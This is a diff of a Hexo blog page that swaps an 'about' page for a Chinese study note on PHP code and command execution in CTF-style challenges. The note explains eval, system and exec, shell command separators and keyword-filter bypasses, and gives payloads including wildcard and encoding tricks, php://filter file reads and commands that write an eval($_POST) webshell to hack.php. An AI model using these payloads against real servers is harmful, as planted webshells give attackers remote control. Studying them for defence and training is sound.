@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>swedsn</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="swedsn">
+  <title>基础系列03-代码执行.md | swedsn</title>
+  <meta name="keywords" content=" Web安全 ">
+  <meta name="description" content="基础系列03-代码执行.md | swedsn">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="忙里偷闲，记录生活关于博客我认为搭建博客主要分为三个阶段  第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感   第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的   第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便">
 <meta property="og:type" content="website">
@@ -56,7 +56,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -644,12 +644,62 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-基础系列03-代码执行-md" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BF%99%E9%87%8C%E5%81%B7%E9%97%B2%EF%BC%8C%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB"><span class="toc-text">忙里偷闲，记录生活</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2"><span class="toc-text">关于博客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%BD%9C%E8%80%85"><span class="toc-text">关于作者</span></a></li></ol></li></ol>
+        <h1 class="article-title">基础系列03-代码执行.md</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web安全">Web安全</a> > 
+            
+            <a  data-rel="Web安全&lt;---&gt;代码执行">代码执行</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Web安全</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2022-09-19 21:03:00'>2022-09-19 21:01</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">一、什么是代码执行与命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93"><span class="toc-text">二、常见函数总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E5%8F%8A%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">1、常见的命令执行函数及运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">2、常见的代码执行函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-text">三、命令连接符</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81windows%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-text">1、windows下常见的命令连接符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-text">2、linux下常见的命令连接符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6%E6%80%BB%E7%BB%93"><span class="toc-text">3、命令连接符总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E4%BB%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">四、常见过滤以及绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">1、绕过过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%E6%96%B9%E6%B3%95"><span class="toc-text">2、绕过过滤关键字方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="toc-text">3、常见关键字替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">4、过滤括号（文件包含绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%8A%E5%85%B6%E5%AD%90%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">5、关键字及其子关键字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97%E4%BB%A5%E5%8F%8A%E5%AD%97%E6%AF%8D"><span class="toc-text">6、过滤数字以及字母</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">7、如何实现上传一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81disable-function"><span class="toc-text">7、disable_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E8%BF%87%E6%BB%A4-lt"><span class="toc-text">8、过滤&lt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-text">9、常见的小技巧</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -662,28 +712,296 @@
     }
 </style>
 </div>
-            <h1 id="忙里偷闲，记录生活"><a href="#忙里偷闲，记录生活" class="headerlink" title="忙里偷闲，记录生活"></a>忙里偷闲，记录生活</h1><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>我认为搭建博客主要分为三个阶段</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="一、什么是代码执行与命令执行"><a href="#一、什么是代码执行与命令执行" class="headerlink" title="一、什么是代码执行与命令执行"></a>一、什么是代码执行与命令执行</h1><p>1、代码执行</p>
 <blockquote>
-<p>第一个阶段：刚开始搭建博客，觉得搭建博客很神奇，就想搭建一个完整的博客，感觉有成就感</p>
+<p>代码执行就是特殊的函数能够将一些字符串当作代码一样来执行，像”phpinfo();”，它本身是字符串，但是加上特殊函数(eval等)之后就会打印出信息。php代码中本身就存在一些特殊的函数像system函数，它的作用就是执行系统命令。这样的话eval(“system(“ls”)”)；这样的话就会执行系统命令，所以说代码执行的定义相比命令执行更加大一些</p>
 </blockquote>
+<p>2、命令执行：</p>
 <blockquote>
-<p>第二个阶段：这个时候已经了解了如何搭建博客。此时就想搭建一个好看，功能丰富的博客，于是尝试了不同的框架，更换了各种各样的主题，想搭建一个自己喜欢的一个博客，同时对于博客的认为是给别人看的</p>
+<p>就是Windows、Linux下面的命令，通过system等就可以执行php代码中执行</p>
 </blockquote>
-<blockquote>
-<p>第三阶段：现在的我，只想要有一个简单的博客，简单到只要方便我查看笔记就行。此时看重的应该是博客本身里面的内容是否优越。并且此时的博客主要一应该是方便自己的使用，至于如果能通过我写的内容能为其他人解惑，当然会更好了</p>
-</blockquote>
-<blockquote>
-<p>本博客并没有使用SEO，如果能看到我的博客，说明你我有缘，希望我写的内容能帮助到你，望共勉！！！</p>
-</blockquote>
-<h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p>想要从事网络安全相关的内容， 目前主要学习web 以及二进制方面的内容</p>
+<h1 id="二、常见函数总结"><a href="#二、常见函数总结" class="headerlink" title="二、常见函数总结"></a>二、常见函数总结</h1><h2 id="1、常见的命令执行函数及运算符"><a href="#1、常见的命令执行函数及运算符" class="headerlink" title="1、常见的命令执行函数及运算符"></a>1、常见的命令执行函数及运算符</h2><p>（1）system函数</p>
+<pre><code class="php">system(string $command, int &amp;$return_var = ?): string
+</code></pre>
+<ul>
+<li>command表示执行的命令</li>
+<li>return_var：存在则表示执行命令后的返回状态将会设置到此变量中</li>
+<li>它会输出返回结果</li>
+</ul>
+<p>（2）exec函数与shell_exec函数</p>
+<ul>
+<li>作用执行系统命令</li>
+<li>exec：输出结果不会返回，需要使用echo才会输出结果</li>
+<li>shell_exec：通过shell环境执行命令，并且会输出完整的结果</li>
+</ul>
+<p>（3）反引号</p>
+<p>它的作用相当于system，但是它不会返回结果，需要用echo输出出来</p>
+<p>（4）除此之外还有很多函数，之后遇到再补充</p>
+<ul>
+<li>pssthru函数</li>
+<li>popen函数</li>
+<li>proc_open函数</li>
+</ul>
+<h2 id="2、常见的代码执行函数"><a href="#2、常见的代码执行函数" class="headerlink" title="2、常见的代码执行函数"></a>2、常见的代码执行函数</h2><p>（1）eval函数</p>
+<pre><code class="php">eval(string $code)
+</code></pre>
+<ul>
+<li>code表示要执行的php代码</li>
+</ul>
+<p>常见的使用eval函数的有</p>
+<pre><code class="php">&lt;?ph eval($_POST[1]);?&gt;
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+&lt;?ph eval(system(&quot;ls&quot;));?&gt;
+</code></pre>
+<p>（2）assert函数</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-ask-429607.html">https://www.php.cn/php-ask-429607.html</a></p>
+<p>（3）除此之外还没很多函数，遇到以后再学</p>
+<ul>
+<li>call_user_func函数</li>
+<li>call_user_func_array函数</li>
+<li>create_function函数</li>
+<li>array_map函数</li>
+<li>preg_replace函数</li>
+</ul>
+<h1 id="三、命令连接符"><a href="#三、命令连接符" class="headerlink" title="三、命令连接符"></a>三、命令连接符</h1><h2 id="1、windows下常见的命令连接符"><a href="#1、windows下常见的命令连接符" class="headerlink" title="1、windows下常见的命令连接符"></a>1、windows下常见的命令连接符</h2><p>（1）&amp;命令连接符</p>
+<ul>
+<li>两条命令都执行，不管前面的语句是否为真</li>
+</ul>
+<p>（2）&amp;&amp;命令连接符</p>
+<ul>
+<li>&amp;&amp;前面的语句为假，直接报错，&amp;&amp;后面的也不执行</li>
+<li>&amp;&amp;前面的语句为真，&amp;&amp;前后的语句都执行</li>
+</ul>
+<p>（3）|命令连接符</p>
+<ul>
+<li>|前面的语句为假，直接报错，|后面的也不执行</li>
+<li>|前面的语句为真，执行|后面的语句</li>
+</ul>
+<p>（4）||命令连接符</p>
+<ul>
+<li>类似if-else语句，前面为真执行前面，否则执行后面</li>
+</ul>
+<h2 id="2、linux下常见的命令连接符"><a href="#2、linux下常见的命令连接符" class="headerlink" title="2、linux下常见的命令连接符"></a>2、linux下常见的命令连接符</h2><p>（1）&amp;命令连接符</p>
+<ul>
+<li>两条命令都执行，不管前面的语句是否为真</li>
+</ul>
+<p>（2）&amp;&amp;命令连接符</p>
+<ul>
+<li>&amp;&amp;前面的语句为假，直接报错，&amp;&amp;后面的也不执行</li>
+<li>&amp;&amp;前面的语句为真，&amp;&amp;前后的语句都执行</li>
+</ul>
+<p>（3）|命令连接符</p>
+<ul>
+<li>|前面的命令的输出作为后面命令的输入，前后命令都执行但是只显示后面的命令结果</li>
+</ul>
+<p>（4）||命令连接符</p>
+<ul>
+<li>类似if-else语句，前面为真执行前面，否则执行后面</li>
+</ul>
+<p>（5）；命令连接符</p>
+<ul>
+<li>多个命令顺序执行，前后两条命令都会执行</li>
+</ul>
+<h2 id="3、命令连接符总结"><a href="#3、命令连接符总结" class="headerlink" title="3、命令连接符总结"></a>3、命令连接符总结</h2><p>（1）区别</p>
+<blockquote>
+<p>Windows与Linux的命令连接符除了|之外差不多，但是两者最终显示的都是|后面的结果。而且linux相比windows多了一条分号</p>
+</blockquote>
+<p>（2）作用</p>
+<blockquote>
+<p>命令连接符的主要作用就是分割命令，分别执行。 目前这种我所看到的主要就是程序会把输出的结果重定向到null处，所以需要使用连接符进行分割</p>
+</blockquote>
+<p>（3）常见命令连接符的使用</p>
+<blockquote>
+<p>Linux下面的分号、||、&amp;。因为这集中前面的结果都会展示</p>
+</blockquote>
+<h1 id="四、常见过滤以及绕过方式"><a href="#四、常见过滤以及绕过方式" class="headerlink" title="四、常见过滤以及绕过方式"></a>四、常见过滤以及绕过方式</h1><h2 id="1、绕过过滤空格"><a href="#1、绕过过滤空格" class="headerlink" title="1、绕过过滤空格"></a>1、绕过过滤空格</h2><p>（1）%09绕过</p>
+<p>（2）{}绕过</p>
+<p><del>（3）${IFS}绕过</del></p>
+<p>（4）&lt;绕过：cat&lt;flag.php</p>
+<h2 id="2、绕过过滤关键字方法"><a href="#2、绕过过滤关键字方法" class="headerlink" title="2、绕过过滤关键字方法"></a>2、绕过过滤关键字方法</h2><p>（1）变量拼接</p>
+<pre><code class="shell">a=c;b=at;$a$b flag.php
+</code></pre>
+<p>（2）空变量绕过</p>
+<pre><code class="shell">ca&#123;x&#125;t flag.php
+</code></pre>
+<p>（3）\绕过</p>
+<pre><code class="shell">c\a\t flag.php
+</code></pre>
+<p>（4）通配符绕过</p>
+<pre><code class="shell">cat flag.*
+</code></pre>
+<p>（5）base64绕过</p>
+<pre><code class="shell">echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d
+</code></pre>
+<p>cat flag.php</p>
+<h2 id="3、常见关键字替换"><a href="#3、常见关键字替换" class="headerlink" title="3、常见关键字替换"></a>3、常见关键字替换</h2><p>（1）cat命令</p>
+<ul>
+<li><p>tac flag</p>
+</li>
+<li><p>c\a\t flag</p>
+</li>
+<li><p>echo Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;|base64 -d</p>
+</li>
+<li><p>nl flag.php</p>
+</li>
+<li><p>more</p>
+</li>
+<li><p>less</p>
+</li>
+<li><p>nl：用来计算文件中的行号，可以理解为cat -n；但是实际上不一样</p>
+</li>
+<li><p>uniq：检查以及删除文本文件中重复出现的行列，然后打印出结果</p>
+</li>
+<li><p>sort：根据每行的首字母的顺序进行排序，打印出结果</p>
+</li>
+<li><p>tail</p>
+</li>
+</ul>
+<p>（2）system函数</p>
+<ul>
+<li>exec</li>
+<li>反引号</li>
+<li>shell_exec</li>
+</ul>
+<h2 id="4、过滤括号（文件包含绕过）"><a href="#4、过滤括号（文件包含绕过）" class="headerlink" title="4、过滤括号（文件包含绕过）"></a>4、过滤括号（文件包含绕过）</h2><p>（1）常见的题型</p>
+<pre><code class="php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>（2）一般是上面的这类题，使用的代码执行（eval函数等），过滤掉了括号，而eval函数一般使用等等方式有</p>
+<p>① 写一句话木马上去</p>
+<pre><code class="http">?c=file_put_contents(&quot;hack.php&quot;, &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot;);
+</code></pre>
+<pre><code class="http">?C=echo &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot; &gt; &quot;hack.php&quot; ;
+</code></pre>
+<p>② 利用system函数执行系统指令以实现绕过 </p>
+<pre><code class="http">?c=system(&quot;cat flag.php&quot;);
+</code></pre>
+<p>③ 使用参数逃逸的方式进行</p>
+<pre><code class="http">?c=eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;)
+</code></pre>
+<blockquote>
+<p>上面的所有情况基本上都是涉及到括号的，这是因为基本上都调用了函数，这主要的原因是php中直接代码getshell的只有一句话木马（我知道的），phpinfo只能是一种测试，本身用处不大。唯一那种木马的绕过方式一旦尖括号被过滤就没有任何办法，所以采取发方式就是文件包含的方式 + 参数逃逸，这个主要的原因是这有这两个函数能在没有括号的时候能获取到文件里面的内容</p>
+</blockquote>
+<pre><code class="http">?c=include $_GET[1];&amp;1=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<h2 id="5、关键字及其子关键字过滤"><a href="#5、关键字及其子关键字过滤" class="headerlink" title="5、关键字及其子关键字过滤"></a>5、关键字及其子关键字过滤</h2><blockquote>
+<p>这种题型适合与关键的命令被过滤掉，此时我们就可以根据系统存放命令的地方结合通配符进行使用</p>
+</blockquote>
+<p>（1）获取基本命令关键字</p>
+<p>在Linux根目录下存在一个bin目录，它的作用就是用来存放系统的所有用户使用的指令。当然肯定会包括cat这些命令</p>
+<p>此时再结合通配符，实现命令绕过</p>
+<ul>
+<li>&#x2F;bin&#x2F;ca?</li>
+</ul>
+<p>当然这种方式肯定是有局限性的，这种方式的主要问题在于你使用的通配符后，对应产生的命令有多条，而他会优先考虑前面的命令，经过在我Ubuntu下面的测试发现下面的指令的是唯一的</p>
+<p><img src="/img/image-20220723102008656.png" alt="image-20220723102008656"></p>
+<p>（2）过滤掉字母</p>
+<p>Linux下面还会存在一个base64的指令，根据通配符匹配后执行的优先级，它会优先执行base64。当然并不是每种环境下面都会存在这个命令，这只是一种方式</p>
+<p><img src="/img/image-20220723101754311.png" alt="image-20220723101754311"></p>
+<p>payload：直接读取flag.php，这种文件名占八位的所有文件的内容，并以十六进制的形式展示出来</p>
+<pre><code class="http">?c=/???/????64 ????????
+</code></pre>
+<h2 id="6、过滤数字以及字母"><a href="#6、过滤数字以及字母" class="headerlink" title="6、过滤数字以及字母"></a>6、过滤数字以及字母</h2><p>（1）异或</p>
+<ul>
+<li><p>‘a’^’&lt;’    &#x3D;&#x3D;》 [</p>
+</li>
+<li><p>‘]’^’&lt;’     &#x3D;&#x3D;》 a</p>
+</li>
+<li><p>取反</p>
+</li>
+<li><p>自增</p>
+</li>
+</ul>
+<h2 id="7、如何实现上传一句话木马"><a href="#7、如何实现上传一句话木马" class="headerlink" title="7、如何实现上传一句话木马"></a>7、如何实现上传一句话木马</h2><p>（1）使用echo语句直接写入</p>
+<pre><code class="http">?C=echo &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot; &gt; &quot;hack.php&quot; ;
+</code></pre>
+<p>（2）使用file_put_contents函数写入</p>
+<pre><code class="http">?c=file_put_contents(&quot;hack.php&quot;, &quot;&lt;?ph eval(\$_POST[1]);?&gt;&quot;);
+</code></pre>
+<h2 id="7、disable-function"><a href="#7、disable-function" class="headerlink" title="7、disable_function"></a>7、disable_function</h2><h2 id="8、过滤-lt"><a href="#8、过滤-lt" class="headerlink" title="8、过滤&lt;"></a>8、过滤&lt;</h2><ul>
+<li><p>过滤掉以后，无法实现一句话木马</p>
+</li>
+<li><p>无法实现</p>
+</li>
+</ul>
+<h2 id="9、常见的小技巧"><a href="#9、常见的小技巧" class="headerlink" title="9、常见的小技巧"></a>9、常见的小技巧</h2><ul>
+<li>短标签替换</li>
+<li>；  &#x3D;&#x3D;》 ?&gt;</li>
+</ul>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+<input type="hidden" id="MathJax-js"
+        value="//cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML">
+</input>
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -692,11 +1010,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
